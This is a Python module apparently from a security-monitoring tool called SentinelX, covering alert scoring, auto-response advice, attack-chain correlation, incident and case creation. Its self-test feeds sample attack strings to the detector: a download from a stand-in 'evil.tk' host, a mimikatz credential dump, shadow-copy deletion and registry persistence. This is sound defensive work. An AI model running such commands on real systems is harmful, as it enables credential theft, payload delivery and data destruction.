    # here we just trust its CRITICAL/HIGH/MEDIUM the same as every other hint.
    if "suricata_risk:critical" in text: score += 75
    elif "suricata_risk:high"   in text: score += 50
    elif "suricata_risk:medium" in text: score += 25

    # Signal 19: Wazuh alert risk (integrations/wazuh_connector.py).
    # Wazuh rule levels run 0-15; the connector buckets those into
    # CRITICAL/HIGH/MEDIUM before this point the same way every other
    # detector reports a hint rather than a raw number.
    if "wazuh_risk:critical" in text: score += 75
    elif "wazuh_risk:high"   in text: score += 50
    elif "wazuh_risk:medium" in text: score += 25

    # Signal 23: Canary/honeytoken triggered (detectors/canary_detector.py) —
    # a decoy file was touched, or the decoy account was used in a logon
    # attempt. Deliberately the single highest flat signal in this table:
    # every other signal here is a heuristic that CAN false-positive on
    # legitimate activity, but nothing legitimate ever touches a canary —
    # any hit at all means real reconnaissance or lateral movement.
    if "canary_hint:triggered" in text: score += 75

    # Signal 24: Statistical anomaly vs. this host's own baseline
    # (core/anomaly_baseline.py) — z-score based, per (host, event) pair,
    # injected into `detail` by process_alert() itself (Stage 3b) before
    # this function ever runs, the same way a detector injects its own
    # hint before calling fire(). Kept modest relative to Signal 23: an
    # anomaly is "unusual for this host," not "unambiguously malicious,"
    # so it nudges severity rather than driving it alone.
    if "anomaly_hint:high"   in text: score += 25
    elif "anomaly_hint:medium" in text: score += 15

    if score >= 71:   return "CRITICAL", score
    if score >= 46:   return "HIGH",     score
    if score >= 21:   return "MEDIUM",   score
    return "LOW", score

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 5 — AUTO RESPONSE BUILDER
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_BASE_RESPONSES = {
    "CRITICAL": [
        "🔴 ISOLATE host from network immediately",
        "🔴 Capture memory dump before remediation",
        "🔴 Preserve forensic evidence (disk image)",
        "🔴 Notify SOC Lead / IR Team now",
        "🔴 Block source IP at perimeter firewall",
    ],
    "HIGH": [
        "🟠 Escalate to Tier-2 analyst immediately",
        "🟠 Review full parent process tree",
        "🟠 Check for lateral movement from this host",
        "🟠 Monitor host for next 30 minutes",
    ],
    "MEDIUM": [
        "🟡 Assign to analyst for review",
        "🟡 Correlate with recent alerts from same host",
        "🟡 Check if activity is authorized or scheduled",
    ],
    "LOW": [
        "🟢 Log and monitor",
        "🟢 Review if part of larger pattern",
    ],
}

_TACTIC_ACTIONS = {
    "credential": [
        "🔑 Reset passwords for affected accounts immediately",
        "🔑 Check for credential reuse across other systems",
        "🔑 Audit privileged account access logs",
    ],
    "lateral": [
        "🌐 Review SMB / RDP connections from this host",
        "🌐 Check for new admin sessions on adjacent hosts",
        "🌐 Isolate subnet if chain confirmed",
    ],
    "persistence": [
        "💾 Audit all startup keys and scheduled tasks",
        "💾 Check for new services or DLL hijacks",
        "💾 Review recently created registry entries",
    ],
    "exfil": [
        "📤 Block ALL outbound from affected host",
        "📤 Review DNS query logs for tunneling pattern",
        "📤 Check proxy logs for unusual data volumes",
    ],
    "impact": [
        "💥 Check Volume Shadow Copies IMMEDIATELY",
        "💥 Activate Business Continuity Plan",
        "💥 Stop any running encryption processes",
    ],
    "command": [
        "🌐 Block C2 IP/domain at perimeter",
        "🌐 Review proxy/DNS logs for beaconing pattern",
        "🌐 Check for periodic outbound connections",
    ],
}

def build_auto_response(severity: str, tactic: str) -> str:
    lines = _BASE_RESPONSES.get(severity, _BASE_RESPONSES["LOW"]).copy()
    t = tactic.lower()
    for key, actions in _TACTIC_ACTIONS.items():
        if key in t:
            lines.extend(actions)
    return "\n".join(lines)

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 6 — CORRELATION ENGINE
#   Rolling 5-min window. Tactic diversity + score threshold
#   → declares multi-stage attack chain alert.
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_chain_events: deque = deque()
_tactic_counts: dict = defaultdict(int)

_TACTIC_WEIGHTS = {
    "Initial Access":       10, "Execution":            15,
    "Persistence":          18, "Privilege Escalation": 20,
    "Defense Evasion":      16, "Credential Access":    22,
    "Discovery":             8, "Lateral Movement":     20,
    "Command & Control":    18, "Exfiltration":         22,
    "Impact":               25, "Unknown":               5,
}
_SEV_BOOST = {"CRITICAL": 25, "HIGH": 15, "MEDIUM": 8, "LOW": 3}

def run_correlation(alert: dict) -> dict | None:
    """
    Adds alert to rolling chain window.
    Returns chain alert dict if threshold exceeded, else None.
    """
    tactic  = alert.get("mitre_tactic","Unknown")
    sev     = alert.get("severity","LOW")
    event   = alert.get("event","Unknown")
    mitre   = alert.get("mitre_id","T0000")
    score   = _TACTIC_WEIGHTS.get(tactic, 5) + _SEV_BOOST.get(sev, 3)
    now     = time.time()

    with _chain_lock:
        _chain_events.append((now, score, event, mitre, tactic))
        _tactic_counts[tactic] += 1

        # prune expired
        while _chain_events and now - _chain_events[0][0] > CHAIN_WINDOW:
            _chain_events.popleft()

        chain_len   = len(_chain_events)
        chain_score = sum(s for _, s, _, _, _ in _chain_events)
        tactic_div  = len(set(t for _, _, _, _, t in _chain_events))

        if chain_len < 3 or chain_score < CHAIN_MIN_SCORE:
            return None

        # Determine chain severity
        if chain_score >= 250 or tactic_div >= 5:
            c_sev = "CRITICAL"
        elif chain_score >= 160 or tactic_div >= 3:
            c_sev = "HIGH"
        else:
            c_sev = "MEDIUM"

        stages    = [e for _, _, e, _, _ in list(_chain_events)[-6:]]
        mit_ids   = list(dict.fromkeys(m for _, _, _, m, _ in list(_chain_events)[-6:]))
        tactics   = list(dict.fromkeys(t for _, _, _, _, t in _chain_events))

        chain_id  = f"CHAIN-{random.randint(100000,999999)}"

        return {
            "id":          chain_id,
            "event":       f"⚡ Multi-Stage Attack Chain ({chain_len} events, score {chain_score})",
            "severity":    c_sev,
            "mitre_id":    "TA0001",
            "mitre_name":  "Attack Chain — Multi-Stage",
            "mitre_tactic":"Attack Chain",
            "mitre_url":   "https://attack.mitre.org/",
            "detail": (
                f"Chain Score    : {chain_score}\n"
                f"Events         : {chain_len} in {CHAIN_WINDOW}s window\n"
                f"Unique Tactics : {tactic_div}\n"
                f"Tactics Path   : {' → '.join(tactics[-5:])}\n"
                f"MITRE IDs      : {', '.join(mit_ids)}\n"
                f"Attack Stages  :\n" +
                "\n".join(f"  {i+1}. {s}" for i,s in enumerate(stages))
            ),
            "host":        alert.get("host","localhost"),
            "user":        alert.get("user","system"),
            "country":     "-", "city": "-", "isp": "-", "ip": "-",
            "vt_score":    0,   "abuse_score": 0,
            "threat_risk": c_sev,
            "auto_response":"🔴 MULTI-STAGE ATTACK IN PROGRESS — Immediate containment required",
            "status":      "OPEN",
            "notes":       "",
            "analyst":     "",
        }

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 7 — INCIDENT ENGINE
#   Per-host: N HIGH/CRITICAL alerts in INCIDENT_WINDOW → incident
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_host_alerts: dict = defaultdict(list)  # host → [timestamps]

def run_incident_engine(alert: dict) -> dict | None:
    if alert.get("severity") not in ("CRITICAL","HIGH"):
        return None

    host = alert.get("host", alert.get("ip","unknown"))
    now  = time.time()

    with _chain_lock:
        _host_alerts[host].append(now)
        _host_alerts[host] = [t for t in _host_alerts[host]
                              if now - t < INCIDENT_WINDOW]
        count = len(_host_alerts[host])

    if count < INCIDENT_THRESHOLD:
        return None

    # Check if recent incident already exists for this host
    incidents = _load(INCIDENT_FILE)
    for inc in incidents[:10]:
        if (inc.get("host") == host and
            inc.get("status") == "OPEN" and
            now - time.mktime(time.strptime(
                inc.get("created","1970-01-01 00:00:00"),
                "%Y-%m-%d %H:%M:%S")) < INCIDENT_WINDOW):
            return None

    iid = f"INC-{random.randint(100000,999999)}"
    return {
        "incident_id":    iid,
        "id":             iid,
        "event":          f"🚨 Incident Declared — Host Under Active Attack",
        "classification": alert.get("event","Unknown"),
        "severity":       "CRITICAL",
        "status":         "OPEN",
        "host":           host,
        "user":           alert.get("user","system"),
        "created":        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_alert":   alert.get("id",""),
        "detail": (
            f"Incident ID   : {iid}\n"
            f"Host          : {host}\n"
            f"Alert Count   : {count} HIGH/CRITICAL in {INCIDENT_WINDOW}s\n"
            f"Trigger Alert : {alert.get('event','Unknown')}\n"
            f"Action        : Escalate to SOC Lead immediately"
        ),
    }

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 8 — PERSISTENCE + FLASK PUSH
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

def _push_to_flask(alert: dict):
    """POST enriched alert to Flask dashboard."""
    if not REQUESTS_OK:
        return
    try:
        requests.post(FLASK_API, json={
            "event":       alert.get("event"),
            "severity":    alert.get("severity"),
            "mitre":       alert.get("mitre_id"),
            "tactic":      alert.get("mitre_tactic"),
            "detail":      alert.get("detail"),
            "host":        alert.get("host"),
            "user":        alert.get("user"),
            "country":     alert.get("country"),
            "city":        alert.get("city"),
            "isp":         alert.get("isp"),
            "ip":          alert.get("ip"),
            "vt_score":    alert.get("vt_score",0),
            "abuse_score": alert.get("abuse_score",0),
        }, timeout=4)
    except Exception:
        pass

def _console_print(alert: dict, label: str = "ALERT"):
    try:
        icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢"}.get(
                alert.get("severity","LOW"),"⚪")
        bar  = "─" * 64
        print(f"\n{icon} [{alert.get('timestamp','')}]  {label}  ·  {alert.get('severity')}")
        print(bar)
        print(f"  EVENT  : {alert.get('event','-')}")
        print(f"  MITRE  : {alert.get('mitre_id','-')}  ·  {alert.get('mitre_tactic','-')}")
        print(f"  SCORE  : {alert.get('score',0)}")
        if alert.get("ip") and alert["ip"] != "-":
            print(f"  IP     : {alert['ip']}  ({alert.get('country','-')} / {alert.get('city','-')})")
        detail_lines = str(alert.get("detail","")).splitlines()
        for line in detail_lines[:3]:
            print(f"  DETAIL : {line[:100]}")
        print(bar)
    except Exception:
        print(f"[{alert.get('timestamp','')}] {label} - {alert.get('severity')} - {alert.get('event','')}")

def _persist_alert(alert: dict):
    """Save alert to file + timeline."""
    alerts = _load(ALERT_FILE)
    alerts.insert(0, alert)
    _save(ALERT_FILE, alerts, MAX_ALERTS)

    tl = _load(TIMELINE_FILE)
    tl.insert(0, {
        "timestamp": alert["timestamp"],
        "event":     alert["event"],
        "severity":  alert["severity"],
        "mitre":     alert.get("mitre_id","-"),
        "tactic":    alert.get("mitre_tactic","-"),
        "alert_id":  alert["id"],
        "host":      alert.get("host", "-"),
    })
    _save(TIMELINE_FILE, tl, MAX_TIMELINE)

    # Sync to Production SQL Database
    try:
        from core.database import db
        db.upsert_alert(alert)
    except Exception:
        pass

CASE_REOPEN_WINDOW_HOURS = 4

def _auto_create_case(alert: dict):
    """Auto-create a case for HIGH/CRITICAL alerts.
    Folds into an existing OPEN case only if it's the same host AND the
    same MITRE tactic AND that case was touched within the last
    CASE_REOPEN_WINDOW_HOURS — otherwise a new case is opened. This stops
    a single-host box from getting exactly one case ever, no matter how
    many distinct attacks happen on it over time."""
    if alert.get("severity") not in ("CRITICAL","HIGH"):
        return
    cases  = _load(CASE_FILE)
    host   = alert.get("host","unknown")
    user   = alert.get("user","unknown")
    tactic = alert.get("mitre_tactic","-")
    now    = datetime.now()

    for c in cases:
        if c.get("host") != host or c.get("status") != "OPEN":
            continue
        if c.get("tactic") != tactic:
            continue
        try:
            last_touch = datetime.strptime(
                c.get("last_alert_at") or c.get("created",""), "%Y-%m-%d %H:%M:%S")
        except ValueError:
            continue
        if (now - last_touch).total_seconds() <= CASE_REOPEN_WINDOW_HOURS * 3600:
            # same host, same tactic, still fresh — fold into it rather
            # than opening a duplicate, and actually record that this
            # alert is now part of the case (previously this branch just
            # returned without updating anything on the case itself)
            c["last_alert_at"] = now.strftime("%Y-%m-%d %H:%M:%S")
            c.setdefault("related_alerts", []).append(alert.get("id",""))
            _save(CASE_FILE, cases, MAX_CASES)
            return

    case = {
        "case_id":  f"CASE-{int(time.time())}",
        "status":   "OPEN",
        "analyst":  "Unassigned",
        "severity": alert.get("severity"),
        "host":     host,
        "user":     user,
        "tactic":   tactic,
        "created":  now.strftime("%Y-%m-%d %H:%M:%S"),
        "last_alert_at": now.strftime("%Y-%m-%d %H:%M:%S"),
        "closed":   "",
        "notes":    [],
        "related_alerts": [alert.get("id","")],
        "source_alert": alert.get("id",""),
    }
    cases.insert(0, case)
    _save(CASE_FILE, cases, MAX_CASES)
    try:
        print(f"\n📁 CASE CREATED: {case['case_id']} → {host} ({tactic})")
    except Exception:
        print(f"\nCASE CREATED: {case['case_id']} - {host} ({tactic})")

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   MAIN PUBLIC FUNCTION — process_alert()
#   Call this from ALL detectors.
#   Returns enriched alert dict or None if duplicate.
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

def process_alert(raw: dict) -> dict | None:
    """
    Full 8-stage pipeline.

    Minimum input:
        {"event": "...", "detail": "..."}

    Optional fields:
        host, user, id (generated if missing)

    Returns enriched alert dict, or None if duplicate.
    """

    event  = raw.get("event",  "Unknown Detection")
    detail = raw.get("detail", "")

    # ── Stage 1: Deduplication ──────────────────────────────
    if _is_duplicate(event, detail):
        return None

    # ── Base fields ─────────────────────────────────────────
    alert = {
        "id":        raw.get("id", f"ALT-{random.randint(10000000,99999999)}"),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "event":     event,
        "detail":    detail,
        "host":      raw.get("host", socket.gethostname()),
        "user":      raw.get("user", "system"),
        "source":    raw.get("source", "unknown"),
        "log_source": raw.get("log_source", "Security"),
        "status":    "OPEN",
        "notes":     "",
        "analyst":   "",
    }

    # ── Stage 1b: Suppression Rules ────────────────────────────
    # Check AFTER base fields are built so rules can match on any field.
    try:
        from core.suppression_rules import check_suppression
        suppression = check_suppression(alert)
        if suppression:
            if suppression.get("action") == "lower_severity":
                # Don't drop — just force severity to low later
                raw["_force_low_severity"] = True
            else:
                # Full suppress — alert is dropped (but logged in suppressed_alerts.json)
                return None
    except ImportError:
        pass

    # ── Stage 2: MITRE Mapping ──────────────────────────────
    mitre = map_mitre(event, detail, override=raw.get("mitre_override"))
    alert.update({
        "mitre":       mitre["mitre_id"],
        "mitre_id":    mitre["mitre_id"],
        "mitre_name":  mitre["mitre_name"],
        "mitre_tactic":mitre["mitre_tactic"],
        "mitre_url":   mitre["mitre_url"],
        "tactic":      mitre["mitre_tactic"],
    })

    # ── Stage 3: Threat Intel ───────────────────────────────
    intel = enrich_threat_intel(detail)
    if 'vt_score' in raw:
        intel['vt_score'] = raw['vt_score']
    if 'abuse_score' in raw:
        intel['abuse_score'] = raw['abuse_score']
    alert.update(intel)

    # ── Stage 3b: Anomaly Baseline (core/anomaly_baseline.py) ──
    # Must run BEFORE Stage 4 — it injects ANOMALY_HINT into `detail`,
    # which Signal 24 then reads exactly the same way every other
    # detector-sourced hint works. This is the one signal not produced
    # by the detector that raised the raw event: it needs a shared,
    # continuously-updated baseline per (host, event) pair across every
    # detector, which no single detector has visibility into on its own,
    # so it's computed centrally, here, for every alert that passes
    # through. Wrapped non-fatal like every other side system in this
    # function — a baseline-file hiccup should never be able to stop an
    # alert from being scored and saved.
    try:
        from core.anomaly_baseline import record_and_check
        anomaly_hint = record_and_check(alert["host"], event)
        if anomaly_hint:
            detail = f"{detail}\nANOMALY_HINT:{anomaly_hint}"
            alert["detail"] = detail
    except Exception as e:
        print(f"[AnomalyBaseline] non-fatal: {e}")

    # ── Stage 4: Risk Scoring → Severity ────────────────────
    severity, score = calculate_severity(
        event, detail,
        intel.get("vt_score",    0),
        intel.get("abuse_score", 0),
        intel.get("ioc_feed_confidence", 0),
    )
    alert["severity"]    = severity
    alert["score"]       = score
    alert["threat_risk"] = intel.get("threat_risk", severity)

    # ── Stage 4a: Suppression override ─────────────────────────
    # If a suppression rule with action='lower_severity' matched,
    # override to low regardless of what the scorer calculated.
    if raw.get("_force_low_severity"):
        alert["severity"] = "low"
        alert["suppressed_by"] = "suppression_rule_downgrade"
        severity = "low"

    # ── Stage 4b: SOAR playbooks (core/soar_engine.py) ──────
    # Runs right after severity is final and before persistence, so every
    # playbook trigger/condition sees the real, finished severity — never
    # a pre-scoring guess. Wrapped so a playbook/action bug can never
    # prevent the alert itself from being recorded; SOAR is a consumer of
    # a finished alert, not a gate on it existing.
    try:
        from core.soar_engine import run_playbooks
        alert["playbook_matches"] = run_playbooks(alert)
    except Exception as e:
        print(f"[SOAR] non-fatal: {e}")
        alert["playbook_matches"] = []

    # ── Stage 4c: Evidence Snapshot (core/evidence_snapshot.py) ─
    # Captures process/connection/logged-in-user state the instant a
    # CRITICAL alert fires — forensic value drops fast once a host is
    # touched further, so this runs as early as severity allows rather
    # than being deferred to persistence. Wrapped non-fatal like SOAR
    # above: a psutil hiccup should never be able to stop the alert
    # itself from being recorded.
    if severity == "CRITICAL":
        try:
            from core.evidence_snapshot import capture_snapshot
            capture_snapshot(alert)
        except Exception as e:
            print(f"[EvidenceSnapshot] non-fatal: {e}")

    # ── Stage 5: Auto Response ──────────────────────────────
    alert["auto_response"] = build_auto_response(
        severity, mitre["mitre_tactic"]
    )

    # ── Stage 8a: Persist + Push ────────────────────────────
    _persist_alert(alert)
    _console_print(alert, label="ALERT")
    # _push_to_flask(alert)
    _auto_create_case(alert)

    # ── Stage 8a-ii: SLA Tracking ──────────────────────────────
    # Start the SLA clock the instant the alert is persisted.
    try:
        from core.sla_tracker import track_new_alert
        track_new_alert(alert["id"], alert.get("severity", "medium"))
    except Exception:
        pass  # SLA tracking is non-fatal

    # ── Stage 8b: Notify (email/Slack/Teams for CRITICAL+, see
    # integrations/notifier.py) — wrapped so a notification failure
    # (bad SMTP creds, webhook down, no network) can never prevent the
    # alert itself from being recorded; this only ever adds a side effect,
    # it's never load-bearing for detection.
    try:
        from integrations.notifier import notify_alert
        notify_alert(alert)
    except Exception as e:
        print(f"[Notifier] non-fatal: {e}")

    # ── Stage 6: Correlation ────────────────────────────────
    chain = run_correlation(alert)
    if chain:
        chain["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        _persist_alert(chain)
        _load_and_save_incident(chain)
        _console_print(chain, label="ATTACK CHAIN")
        # _push_to_flask(chain)

    # ── Stage 7: Incident Engine ─────────────────────────────
    incident = run_incident_engine(alert)
    if incident:
        incident["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        _persist_alert(incident)
        _load_and_save_incident(incident)
        _console_print(incident, label="INCIDENT DECLARED")
        # _push_to_flask(incident)

    return alert

def _load_and_save_incident(item: dict):
    incidents = _load(INCIDENT_FILE)
    incidents.insert(0, item)
    _save(INCIDENT_FILE, incidents, MAX_INCIDENTS)

# ─────────────────────────────────────────────────────────────
# CONVENIENCE WRAPPER — used by all detectors
# ─────────────────────────────────────────────────────────────

def fire(event: str, detail: str,
         host: str = None,
         user: str = "system") -> dict | None:
    """
    Simplest way to fire an alert from any detector.
    Pipeline handles everything else automatically.

    Usage:
        from core.alert_pipeline import fire
        fire("Malicious EXE Detected", f"Path: {full_path}", host="WORKSTATION-01")
    """
    return process_alert({
        "event":  event,
        "detail": detail,
        "host":   host or socket.gethostname(),
        "user":   user,
    })

# ─────────────────────────────────────────────────────────────
# SELF-TEST — run this file directly to verify pipeline
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("\n" + "═"*60)
    print("  SentinelX Alert Pipeline — Self-Test")
    print("═"*60 + "\n")

    tests = [
        ("Suspicious PowerShell Detected",
         "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ=",
         "WORKSTATION-01"),

        ("Office Macro Attack Chain",
         "winword.exe → powershell.exe | invoke-webrequest http://evil.tk/payload",
         "WORKSTATION-01"),

        ("LSASS Credential Dump",
         "mimikatz.exe sekurlsa::logonpasswords targeting lsass.exe",
         "WORKSTATION-01"),

        ("Shadow Copy Deletion",
         "cmd.exe vssadmin delete shadows /all /quiet",
         "WORKSTATION-01"),

        ("Registry Persistence",
         r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run → evil.exe",
         "WORKSTATION-01"),

        ("C2 Network Connection",
         "powershell.exe → 185.22.134.5:4444 [SYN_SENT]",
         "WORKSTATION-01"),
    ]

    for event, detail, host in tests:
        result = fire(event, detail, host=host)
        if result:
            print(f"  ✅  [{result['severity']:8}] {result['event'][:55]}")
        else:
            print(f"  ⛔  DUPLICATE: {event[:55]}")
        time.sleep(0.1)

    print(f"\n  Results written to: {ALERT_FILE}")
    print("  Run app.py and open http://127.0.0.1:5000 to see them.\n")